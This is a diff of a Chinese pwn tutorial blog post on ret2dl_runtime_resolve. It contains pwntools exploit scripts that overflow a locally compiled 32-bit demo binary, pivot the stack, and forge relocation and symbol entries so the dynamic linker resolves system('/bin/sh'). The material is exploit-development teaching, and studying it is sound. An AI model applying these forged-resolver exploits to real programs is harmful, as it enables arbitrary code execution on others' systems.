@@ -1,6 +1,6 @@
 ---
 title: "ret2dl_runtime_resolve"
-description: "拖了超级超级久才学了 ret2dl ，学会后发现确实有点麻烦，可以考虑 ret2all 之类的打法"
+description: "延迟绑定可以被劫持：伪造 reloc_index、r_info 与符号名，让解析器把任意函数解析成你要的那个。"
 pubDate: 2025-11-24
 category: pwn
 tags: [ret2dl]
@@ -8,19 +8,17 @@ tags: [ret2dl]
 
 ## 前置
 
-在学习 ret2libc 的时候，了解了延迟绑定（lazy binding）机制[^1]。
-
-> 延迟绑定（lazy binding）：动态链接器用来减少程序启动时间的一种技术，在函数第一次被调用的时候再和函数地址绑定。
+ret2libc 里绕不开延迟绑定（lazy binding）：动态链接器为了缩短启动时间，把函数地址的绑定推迟到第一次调用时才做（细节见[这篇分析](https://yjy123123.github.io/2021/12/06/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/)）。
 
 这个过程同样可以被劫持，让函数地址绑定成另一个函数。
 
-## ret2dl_runtime_resolve[^2]
+## 原理
 
-为方便阐述，笔者将在下文用 `ret2dl` 代替 `ret2dl_runtime_resolve` 。
+下文用 `ret2dl` 代指 `ret2dl_runtime_resolve`。
 
-虽然 32 位程序和 64 位程序在函数参数传递上存在差异，但笔者仅讲述其中一种情况的 `ret2dl`。
+32 位和 64 位在参数传递上有差异，这里只讲 32 位的做法。
 
-### 源码
+## 源码
 
 ```C
 #include<stdio.h>
@@ -39,9 +37,9 @@ int main(){
 
 编译命令：`gcc -m32 -o example example.c -no-pie -fno-stack-protector -w`
 
-### 查看并伪造函数绑定过程
+## 绑定流程
 
-用 gdb 调试程序，断点打在 0x804918D ，也就是 read 函数被调用的位置，然后 __si__ , 发现程序会先跳转到 read 的 got 表内的地址，一开始应该是 read 的 plt 地址加 6 ，其内容如下
+在 `0x804918d`（`read` 的调用点）下断点，一路 `si` 跟进去，能看到它先跳到 `read` 的 GOT 项里存的地址；第一次调用时那里面是 `read@plt+6`：
 
 ```
  ► 0x8049040  <read@plt>                  jmp    dword ptr [read@got[plt]]   <read@plt+6>
@@ -53,9 +51,9 @@ int main(){
    0x8049026                              jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+8] <_dl_runtime_resolve>
 ```
 
-其过程为 `read@plt -> [read@got] = read@plt+6 -> push reloc_index -> push link_map -> _dl_runtime_resolve` ，该过程中的 reloc_index （上文中的 8 ）和 link_map （上文中的 dword ptr [\_GLOBAL_OFFSET_TABLE_+4]) 就是确定所绑定的函数信息的。那么这两个值的含义是什么呢，8 代表了绑定的函数信息在 `.rel.plt` 段对应的偏移。
+其过程为 `read@plt -> [read@got] = read@plt+6 -> push reloc_index -> push link_map -> _dl_runtime_resolve` ，该过程中的 reloc_index （上文中的 8 ）和 link_map （上文中的 dword ptr [\_GLOBAL_OFFSET_TABLE_+4]) 就是确定所绑定的函数信息的。这两个值分别是什么？8 是这条符号信息在 `.rel.plt` 中的下标（reloc_index）。
 
-以这个程序的 read 为例，0x080482FC-080482F4 的值就是 8
+以 `read` 为例，`0x080482FC - 0x080482F4 = 8`：
 
 ```
 LOAD:080482F4 ; ELF JMPREL Relocation Table
@@ -63,9 +61,9 @@ LOAD:080482F4                 Elf32_Rel <804C000h, 107h> ; R_386_JMP_SLOT __libc
 LOAD:080482FC                 Elf32_Rel <804C004h, 207h> ; R_386_JMP_SLOT read
 ```
 
-#### 伪造 reloc_index
+### 四段 payload 的共同骨架
 
-尝试伪造 reloc_index ，笔者打算用栈迁移的方法迁移栈到 .rel.plt 段之后伪造对应的结构体 ELF32_Rel，信息和上文填的一样就行，也就是 0x804C004 和 0x207 。
+后面每一步都基于同一段骨架：先溢出盖掉返回地址，用 `read` 把第二段 payload 读进 `tar_stack`，再用 `leave; ret` 把栈迁过去。四段的差别只在第二段 payload 里补了哪些字段，所以骨架先给一次，后面每步只说改哪几行。
 
 ```python
 from pwn import *
@@ -82,44 +80,47 @@ b *0x804919A
 io = process(elf.path)
 gdb.attach(io, script)
 
-tar_stack = 0x804C800
+tar_stack = 0x804C800      # 伪造的结构体放在这里
 vuln_skip_rbp = 0x8049169
 leave_ret = 0x8049199
-analyse_func = 0x8049020
-analyse_func_no_push = 0x8049026
+analyse_func = 0x8049020   # PLT0：push link_map; jmp _dl_runtime_resolve
+offset = 0x108
 
 rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
 dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
 dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
 
-offset = 0x108
-
-payload = b'a' * offset
-payload += p32(tar_stack-4)
+# 第一段：溢出 + 栈迁移，把第二段 payload 读进 tar_stack
+payload  = b'a' * offset
+payload += p32(tar_stack - 4)
 payload += p32(elf.plt['read'])
 payload += p32(leave_ret)
-payload += p32(0)  # stdin
+payload += p32(0)          # stdin
 payload += p32(tar_stack)
-payload += p32(0x600)  # size
+payload += p32(0x600)      # size
 io.sendline(payload)
 
 pause()
 
-reloc_index = tar_stack - rel_plt + 0x18
-
-payload = p32(analyse_func)
-payload += p32(reloc_index)
-payload += p32(0xdeadbeef)  # fake return addr
-payload += p32(0) + p32(tar_stack) + p32(0x200)
-payload += p32(0x804C004) + p32(0x207)	# fake ELF32_Rel
+# 第二段：跳到 PLT0，手动走一遍解析流程
+payload  = p32(analyse_func)
+payload += p32(reloc_index)                  # ← 下面每步改的就是这里往下几行
+payload += p32(0xdeadbeef)                   # 假的返回地址
+payload += p32(0) + p32(tar_stack) + p32(0x200)   # 解析完要调的函数与它的参数
 io.sendline(payload)
 
 io.interactive()
 ```
 
-运行发现正确执行 read，可以交互进行读入。
+### 伪造 reloc_index
 
-#### 伪造 ELF32_Rel 结构体的值
+`reloc_index` 指向 `.rel.plt` 里的哪一条。真的 `read` 是第 8 条，我们把它改到 `tar_stack` 附近，再在紧跟着的位置铺一个假的 `ELF32_Rel`：
+
+```python
+reloc_index = tar_stack - rel_plt + 0x18
+```
+
+### 伪造 ELF32_Rel 结构体的值
 
 ```C
 typedef struct{
@@ -128,76 +129,27 @@ typedef struct{
 }Elf32_Rel
 ```
 
-第一个字段 r_offset 就是解析结果（函数真实地址）要写入的地址，正常为对应函数的 got 地址，伪造的话可以继续用也可以顺便找个可写地址。重点在于第二个字段 r_info ，上文中的值为 0x207。其中 r_info 的低 8 位是重定位的类型，而高 8 位的值是对应在 symbol table 中 的偏移。
-
-```
-LOAD:0804820C ; ELF Symbol Table
-LOAD:0804820C                 Elf32_Sym <0>
-LOAD:0804821C                 Elf32_Sym <offset aLibcStartMain - offset unk_804825C, 0, 0, 12h, 0, \ ; "__libc_start_main"
-LOAD:0804821C                            0>
-LOAD:0804822C                 Elf32_Sym <offset aRead - offset unk_804825C, 0, 0, 12h, 0, 0> ; "read"
-LOAD:0804823C                 Elf32_Sym <offset aGmonStart - offset unk_804825C, 0, 0, 20h, 0, 0> ; "__gmon_start__"
-LOAD:0804824C                 Elf32_Sym <offset aIoStdinUsed - offset unk_804825C, \ ; "_IO_stdin_used"
-LOAD:0804824C                            offset _IO_stdin_used, 4, 11h, 0, 0Fh>
-```
-
-从 0 下标开始索引，2 对应的确实是 read 函数。与上面伪造 reloc_index 相同，也是把偏移填大一点，伪造的内容在栈迁移部分的后面。
+第一个字段 `r_offset` 是解析结果（函数真实地址）要写入的地方，正常是对应函数的 GOT 项，伪造时可以继续用，也可以换成任意可写地址。重点在第二个字段 `r_info`。
 
 ```python
-from pwn import *
-
-context.binary = elf = ELF('./example')
-context.log_level = 'debug'
-context.terminal = ['tmux', 'splitw', '-h']
-
-libc = elf.libc
-
-script = '''
-b *0x804919A
-'''
-io = process(elf.path)
-gdb.attach(io, script)
-
-tar_stack = 0x804C800
-vuln_skip_rbp = 0x8049169
-leave_ret = 0x8049199
-analyse_func = 0x8049020
-analyse_func_no_push = 0x8049026
-
-rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
-dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
-dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
-
-offset = 0x108
-
-payload = b'a' * offset
-payload += p32(tar_stack-4)
-payload += p32(elf.plt['read'])
-payload += p32(leave_ret)
-payload += p32(0)  # stdin
-payload += p32(tar_stack)
-payload += p32(0x600)  # size
-io.sendline(payload)
-
-pause()
-
-reloc_index = tar_stack - rel_plt + 0x18
 r_info = (((tar_stack - dynsym + 0x2C) // 0x10) << 8) | 0x7
-# (tar_stack - dynsym + 0x2C) % 0x10 == 0, "必须对齐"
+# (tar_stack - dynsym + 0x2C) % 0x10 == 0，符号表项必须 16 字节对齐
 
-payload = p32(analyse_func)
-payload += p32(reloc_index)
-payload += p32(0xdeadbeef)  # fake return addr
-payload += p32(0) + p32(tar_stack) + p32(0x200)
-payload += p32(0x804C004) + p32(r_info) #fake ELF32_Rel
-payload += b'k'*12
-payload += p32(0x10) + p32(0) + p32(0) + p8(0x12) + p8(0) + p16(0)  #fake ELF32_Sym
-io.sendline(payload)
-
-io.interactive()
+payload += p32(0x804C004) + p32(r_info)      # 假的 ELF32_Rel
 ```
 
-#### 伪造 ELF32_Sym 结构体的值
+`r_info` 低 8 位是重定位类型：x86 上用 7（`R_386_JMP_SLOT`），也就是示例里 `0x207` 的 `07`；除低 8 位以外的部分是符号在 `.dynsym` 里的下标，这里为 2。
+
+```text
+LOAD:0804820C ; ELF Symbol Table
+LOAD:0804820C                 Elf32_Sym <0>
+LOAD:0804821C                 Elf32_Sym <offset aLibcStartMain - offset unk_804825C, 0, 0, 12h, 0, 0> ; "__libc_start_main"
+LOAD:0804822C                 Elf32_Sym <offset aRead - offset unk_804825C, 0, 0, 12h, 0, 0> ; "read"
+```
+
+从 0 开始数，下标 1 是 `__libc_start_main`、2 是 `read`，所以 `0x207` 里的 2 正对应 `read`。伪造时同样把下标填大，指向栈上自己铺的那一项。
+
+### 伪造 ELF32_Sym 结构体的值
 
 ```C
 typedef struct
@@ -211,87 +163,23 @@ typedef struct
 }Elf32_Sym;
 ```
 
-在 symbol table 中，发现就 st_name 和 st_info 的值非零，那么零字段继续保持为零，不过多关注。st_name 是对应的函数名称字符串在 string table 中的偏移，而 st_info 字段则是高 4 位是绑定信息，低四位是符号类型信息。
-
-```
-LOAD:0804825C ; ELF String Table
-LOAD:0804825C unk_804825C     db    0                 ; DATA XREF: LOAD:0804821C↑o
-LOAD:0804825C                                         ; LOAD:0804822C↑o ...
-LOAD:0804825D aIoStdinUsed    db '_IO_stdin_used',0   ; DATA XREF: LOAD:0804824C↑o
-LOAD:0804826C aRead           db 'read',0             ; DATA XREF: LOAD:0804822C↑o
-LOAD:08048271 aLibcStartMain  db '__libc_start_main',0
-LOAD:08048271                                         ; DATA XREF: LOAD:0804821C↑o
-LOAD:08048283 aLibcSo6        db 'libc.so.6',0        ; DATA XREF: LOAD:080482BC↓o
-LOAD:0804828D aGlibc20        db 'GLIBC_2.0',0        ; DATA XREF: LOAD:080482CC↓o
-LOAD:08048297 aGlibc234       db 'GLIBC_2.34',0       ; DATA XREF: LOAD:080482DC↓o
-LOAD:080482A2 aGmonStart      db '__gmon_start__',0   ; DATA XREF: LOAD:0804823C↑o
-LOAD:080482B1                 align 2
-```
-
-仅伪造 dt_name 就就好，
+对照真的符号表项，只有 `st_name` 和 `st_info` 非零，其余保持 0 即可。`st_name` 是函数名在字符串表里的偏移，`st_info` 高 4 位是绑定信息、低 4 位是符号类型。
 
 ```python
-from pwn import *
-
-context.binary = elf = ELF('./example')
-context.log_level = 'debug'
-context.terminal = ['tmux', 'splitw', '-h']
-
-libc = elf.libc
-
-script = '''
-b *0x804919A
-'''
-io = process(elf.path)
-gdb.attach(io, script)
-
-tar_stack = 0x804C800
-vuln_skip_rbp = 0x8049169
-leave_ret = 0x8049199
-analyse_func = 0x8049020
-analyse_func_no_push = 0x8049026
-
-rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
-dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
-dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
-
-offset = 0x108
-
-payload = b'a' * offset
-payload += p32(tar_stack-4)
-payload += p32(elf.plt['read'])
-payload += p32(leave_ret)
-payload += p32(0)  # stdin
-payload += p32(tar_stack)
-payload += p32(0x600)  # size
-io.sendline(payload)
-
-# (tar_stack - dynsym + 0x2C) % 0x10 == 0
-reloc_index = tar_stack - rel_plt + 0x18
-r_info = (((tar_stack - dynsym + 0x2C) // 0x10) << 8) | 0x7
 st_name = tar_stack - dynstr + 0x3C
 
-pause()
-
-payload = p32(analyse_func)
-payload += p32(reloc_index)
-payload += p32(0xdeadbeef)  # fake return addr
-payload += p32(0) + p32(tar_stack) + p32(0x200)
-payload += p32(0x804C004) + p32(r_info) #fake ELF32_Rel
-payload += b'k'*12
-payload += p32(st_name) + p32(0) + p32(0) + p8(0x12) + p8(0) + p16(0)  #fake ELF32_Sym
+payload += b'k' * 12        # 对齐填充
+payload += p32(st_name) + p32(0) + p32(0) + p8(0x12) + p8(0) + p16(0)  # 假的 ELF32_Sym
 payload += b'read\0'
-
-io.sendline(payload)
-
-io.interactive()
 ```
 
-#### 劫持成目标函数
+这里只需伪造 `st_name`，让解析器到栈上读我们写的字符串；`st_info` 的 `0x12` 表示"全局函数"。
 
-了解了一遍绑定流程，发现最后是通过字符串去解析函数的，只要最后改成目标函数的字符串，就能触发目标函数。
+### 劫持成目标函数
 
-下面给出一个劫持为 system 的例子
+走完这一遍就能看出：解析器最后是按字符串去查函数的。把这个字符串换成目标函数名，解析结果就成了目标函数。
+
+下面把四步合起来，换成 `system("/bin/sh")`：
 
 ```python
 from pwn import *
@@ -312,7 +200,6 @@ tar_stack = 0x804C800
 vuln_skip_rbp = 0x8049169
 leave_ret = 0x8049199
 analyse_func = 0x8049020
-analyse_func_no_push = 0x8049026
 
 rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
 dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
@@ -320,31 +207,32 @@ dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
 
 offset = 0x108
 
-payload = b'a' * offset
-payload += p32(tar_stack-4)
+# 第一段：溢出 + 栈迁移
+payload  = b'a' * offset
+payload += p32(tar_stack - 4)
 payload += p32(elf.plt['read'])
 payload += p32(leave_ret)
-payload += p32(0)  # stdin
+payload += p32(0)
 payload += p32(tar_stack)
-payload += p32(0x600)  # size
+payload += p32(0x600)
 io.sendline(payload)
 
-# (tar_stack - dynsym + 0x2C) % 0x10 == 0
 reloc_index = tar_stack - rel_plt + 0x18
 r_info = (((tar_stack - dynsym + 0x2C) // 0x10) << 8) | 0x7
 st_name = tar_stack - dynstr + 0x3C
 
 pause()
 
-sh_addr = tar_stack + 0x44
+sh_addr = tar_stack + 0x44     # "/bin/sh" 在栈上的位置
 
-payload = p32(analyse_func)
+# 第二段：伪造 Rel + Sym + 字符串
+payload  = p32(analyse_func)
 payload += p32(reloc_index)
-payload += p32(0xdeadbeef)  # fake return addr
-payload += p32(sh_addr) + b'k'*8
-payload += p32(0x804C004) + p32(r_info) #fake ELF32_Rel
-payload += b'k'*12
-payload += p32(st_name) + p32(0) + p32(0) + p8(0x12) + p8(0) + p16(0)  #fake ELF32_Sym
+payload += p32(0xdeadbeef)
+payload += p32(sh_addr) + b'k' * 8                    # system 的参数
+payload += p32(0x804C004) + p32(r_info)               # 假的 ELF32_Rel
+payload += b'k' * 12
+payload += p32(st_name) + p32(0) + p32(0) + p8(0x12) + p8(0) + p16(0)  # 假的 ELF32_Sym
 payload += b'system\0\0'
 payload += b'/bin/sh\0'
 
@@ -353,13 +241,13 @@ io.sendline(payload)
 io.interactive()
 ```
 
-### 总述
+## 小结
 
-ret2dl 的手法并不算难理解，主要的优点就是不依靠 libc 来执行任意函数。
+`ret2dl` 本身不难理解，好处是不依赖 libc 就能调到程序已导入的任意函数。
 
-64 位的情况就留给师傅们自己尝试吧，如果有疑问也可以联系我。
+64 位的思路一致，区别在 `r_info` 变成 64 位（并且符号下标在高位）、重定位表换成 `.rela.plt`、多了一个 `r_addend` 字段，可以照着这条链路自己走一遍。
 
 ## 参考文献
 
-[^1]: [延迟绑定](https://yjy123123.github.io/2021/12/06/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/)
-[^2]: [ret2dlresolve小记](https://ltfa1l.top/2024/06/05/system/StackOverflow/ret2dlresolve/)
+- [延迟绑定过程分析](https://yjy123123.github.io/2021/12/06/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/)
+- [ret2dlresolve 小记](https://ltfa1l.top/2024/06/05/system/StackOverflow/ret2dlresolve/)
